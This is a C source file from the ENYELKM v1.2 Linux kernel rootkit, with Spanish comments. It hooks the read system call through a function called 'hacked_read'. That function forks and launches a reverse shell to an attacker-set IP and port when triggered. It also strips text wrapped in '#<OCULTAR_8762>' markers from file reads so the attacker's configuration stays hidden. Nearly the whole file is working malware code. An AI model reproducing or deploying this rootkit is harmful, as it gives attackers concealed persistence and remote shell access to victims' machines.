/*
 * ENYELKM v1.2
 * Linux Rootkit x86 kernel v2.6.x
 *
 * By RaiSe && David Reguera
 * < raise@enye-sec.org
 *   davidregar@yahoo.es
 *   http://www.enye-sec.org >
 */

#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/ip.h>
#include <net/tcp.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include "remoto.h"
#include "config.h"
#include "syscalls.h"

#define SSIZE_MAX 32767


/* define marcas */
#define MOPEN "#<OCULTAR_8762>"
#define MCLOSE "#</OCULTAR_8762>"


/* declaraciones externas */
extern short lanzar_shell;
extern atomic_t read_activo;
extern unsigned long global_ip;
extern unsigned short global_port;

/* syscalls */
static inline my_syscall0(pid_t, fork);


struct file *e_fget_light(unsigned int fd, int *fput_needed)
{
    struct file *file;
    struct files_struct *files = current->files;

    *fput_needed = 0;
    if (likely((atomic_read(&files->count) == 1))) {
        file = fcheck(fd);
    } else {
        spin_lock(&files->file_lock);
        file = fcheck(fd);
        if (file) {
            get_file(file);
            *fput_needed = 1;
        }
        spin_unlock(&files->file_lock);
    }
    return file;

} /*********** fin get_light **********/



int checkear(void *arg, int size, struct file *fichero)
{
char *buf;


/* si SSIZE_MAX <= size <= 0 retornamos -1 */
if ((size <= 0) || (size >= SSIZE_MAX))
	return(-1);

/* reservamos memoria para el buffer y copiamos */
buf = (char *) kmalloc(size+1, GFP_KERNEL);
__copy_from_user((void *) buf, (void *) arg, size);
buf[size] = 0;

/* chequeamos las marcas */
if ((strstr(buf, MOPEN) != NULL) && (strstr(buf, MCLOSE) != NULL))
	{
	/* se encontraron las dos, devolvemos 1 */
	kfree(buf);
	return(1);
	}

/* liberamos y retornamos -1 para q no haga nada */
kfree(buf);
return(-1);

} /********** fin de checkear() *************/



int hide_marcas(void *arg, int size)
{
unsigned long nwarm;
char *buf, *p1, *p2;
int i, newret;


/* reservamos y copiamos */
buf = (char *) kmalloc(size, GFP_KERNEL);
__copy_from_user((void *) buf, (void *) arg, size);

p1 = strstr(buf, MOPEN);
p2 = strstr(buf, MCLOSE);
p2 += strlen(MCLOSE);

i = size - (p2 - buf);

memmove((void *) p1, (void *) p2, i);
newret = size - (p2 - p1);

/* copiamos al user space, liberamos y retornamos */
nwarm = __copy_to_user((void *) arg, (void *) buf, newret);
kfree(buf);

return(newret);

}  /********** fin de hide_marcas **********/



asmlinkage ssize_t hacked_read(int fd, void *buf, size_t nbytes)
{
struct file *fichero;
int fput_needed;
ssize_t ret;


/* se hace 1 copia del proceso y se lanza la shell */
if (lanzar_shell == 1)
    {
    lanzar_shell = 0;

	if (!fork())
		reverse_shell();

	#if DEBUG == 1
	printk("enyelkm: proceso que lanzo reverse_shell continua\n");
	#endif
    }

/* seteamos read_activo a uno */
atomic_set(&read_activo, 1);

/* error de descriptor no valido o no abierto para lectura */
ret = -EBADF;

fichero = e_fget_light(fd, &fput_needed);

if (fichero)
	{
	ret = vfs_read(fichero, buf, nbytes, &fichero->f_pos);

	/* aqui es donde analizamos el contenido y ejecutamos la
	funcion correspondiente */

	switch(checkear(buf, ret, fichero))
	    {
	    case 1:
			/* marcas */
	        ret = hide_marcas(buf, ret);
	        break;

	    case -1:
	        /* no hacer nada */
	        break;
	    }

	fput_light(fichero, fput_needed);
	}

/* seteamos read_activo a cero */
atomic_set(&read_activo, 0);

return ret;

} /********** fin hacked_read **********/


// EOF
